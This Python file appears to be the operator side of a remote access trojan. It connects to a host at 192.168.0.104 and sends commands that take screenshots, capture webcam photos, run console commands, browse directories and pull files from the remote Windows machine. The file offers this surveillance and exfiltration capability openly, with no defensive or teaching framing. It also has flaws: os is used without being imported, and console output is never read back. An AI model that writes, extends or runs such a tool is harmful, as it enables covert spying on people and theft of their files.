import json
import time
import socket
import cv2
import numpy as np


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.0.104", 1000))
working_directory = "C:\\"

def get_help():
    print("\n[+] EXEC_SCREENSHOT filename.jpg destination")
    print("[+] EXEC_CAMERA_PHOTO filename.jpg destination")
    print("[+] EXEC_CONSOLE command")
    print("[+] GET_DIRECTORY_CONTENTS directory")
    print("[+] SET_WORKING_DIRECTORY directory")
    print("[+] PRINT_WORKING_DIRECTORY")
    print("[+] LEAVE_WORKING_DIRECTORY")
    print("[+] EXEC_FILE_TRANSFER filename destination")
    print("[+] HELP\n")

def leave_directory(dir_):
    if "\\" in dir_:
        dir_ = dir_.rpartition("\\")[0]
    return dir_

def get_instruction(client):
    while True:
        if len(working_directory) > 30:
            instruction = input(f"{working_directory[:30]}... >>> ")
        else:
            instruction = input(f"{working_directory} >>> ")
        send_instruction(client, instruction.split(" ", 1))


def recv_file(name, buffer):
    size = client.recv(1024).decode("utf-8")
    with open(name, "wb") as file:
        print(f">   Receiving {name} ...")
        parts = int(size) // buffer
        for i in range(parts):
            data = client.recv(buffer)
            file.write(data)
    print(f">   Received and save as {name}!")

        
def send_instruction(client, instruction):
    global working_directory
    packet = {
        "instruction": instruction,
    }
    packet = json.dumps(packet, indent=2)
    name = ""
    if len(instruction) >= 2:
        name = instruction[1]
    if instruction[0] == "EXEC_SCREENSHOT":
        if name:
            client.send(packet.encode("utf-8"))
            recv_file(name, 512)
        else:
            print(">   Name of file for download required!")
    elif instruction[0] == "EXEC_CAMERA_PHOTO":
        if name:
            client.send(packet.encode("utf-8"))
            recv_file(name, 1)
        else:
            print(">   Name of file for download required!")
    elif instruction[0] == "EXEC_CONSOLE":
        client.send(packet.encode("utf-8"))
    elif instruction[0] == "GET_DIRECTORY_CONTENTS":
        path = instruction[1] if len(instruction) == 2 else working_directory
        client.send(packet.encode("utf-8"))
        result = client.recv(1024).decode("utf-8")
        result = json.loads(result)
        if result["contents"]:
            for item in result["contents"]:
                print(item)
        else:
            print(">   Empty directory!")
    elif instruction[0] == "SET_WORKING_DIRECTORY":
        if instruction[1][1:3] != ":\\":
            packet = json.loads(packet)
            packet["instruction"][1] = f"{working_directory}\\{instruction[1]}"
            instruction[1] = f"{working_directory}\\{instruction[1]}"
            packet = json.dumps(packet, indent=2)
        client.send(packet.encode("utf-8"))
        is_succeed = client.recv(1024).decode("utf-8").lower()
        if is_succeed == "true":
            working_directory = instruction[1]
            if working_directory[len(working_directory)-1] == "\\":
                working_directory = working_directory[0:len(working_directory)-1]
            print(">   Done!")
        else:
            print(">   Directory doesn't exist!")
    elif instruction[0] == "PRINT_WORKING_DIRECTORY":
        print(f">   Current working directory: \
    {working_directory if working_directory != '' else 'no selected working directory!'}")
    elif instruction[0] == "EXEC_FILE_TRANSFER":
        if len(instruction) >= 2:
            if len(instruction) == 3:
                if os.path.exists(instruction[2]):
                    name = f"{instruction[2]}\\{name}"
            client.send(packet.encode("utf-8"))
            if "\\" in name:
                new_name = ""
                rname = name[::-1]
                for symb in rname:
                    if symb == "\\":
                        break
                    new_name += symb
                name = new_name[::-1]
            is_exists = client.recv(1024).decode("utf-8")
            if is_exists == "true":
                recv_file(name, 1024)
            else:
                print(">   File not found!")
        else:
            print(">   File not found!")
    elif instruction[0] == "LEAVE_WORKING_DIRECTORY":
        instruction = ["SET_WORKING_DIRECTORY", leave_directory(working_directory)]
        send_instruction(client, instruction)
    elif instruction[0] == "HELP":
        get_help()

get_help()
get_instruction(client)
